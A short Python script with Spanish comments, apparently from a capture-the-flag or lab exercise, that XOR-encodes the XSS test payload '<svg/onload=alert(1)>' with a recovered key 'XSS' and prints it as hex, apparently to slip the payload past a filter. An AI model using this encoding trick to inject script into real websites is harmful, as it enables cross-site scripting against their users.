payload = "<svg/onload=alert(1)>"   # Lo que querés que aparezca
key = "XSS"                         # La clave que descubrimos

# Repetimos la clave hasta tener el mismo largo que el payload
key_full = (key * ((len(payload) // len(key)) + 1))[:len(payload)]

cipher_bytes = []
for p, k in zip(payload.encode(), key_full.encode()):
    cipher_bytes.append(p ^ k)      # XOR byte a byte

# Lo pasamos a hex
cipher_hex = ''.join(f'{b:02x}' for b in cipher_bytes)
print(cipher_hex)
